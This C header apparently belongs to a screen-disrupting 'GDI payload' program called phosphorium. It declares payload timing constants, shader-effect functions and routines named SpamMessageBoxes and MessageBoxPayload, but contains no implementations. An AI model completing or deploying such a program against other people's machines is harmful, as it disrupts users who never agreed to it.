#pragma once
#include "phosphorium.h"

#define PAYLOAD_TIME 30
#define PAYLOAD_COOLDOWN 100

VOID
ExecuteGdiShader(
	_In_ GDI_SHADER gsShader,
	_In_ INT nTimer
);

VOID
WINAPI
SpamMessageBoxes(VOID);

VOID
WINAPI
MessageBoxPayload(VOID);

GDI_SHADER GdiShader1;
GDI_SHADER GdiShader2;
GDI_SHADER GdiShader3;
GDI_SHADER GdiShaderWave;
GDI_SHADER GdiShader5;
GDI_SHADER GdiShader6;
GDI_SHADER FinalGdiShader;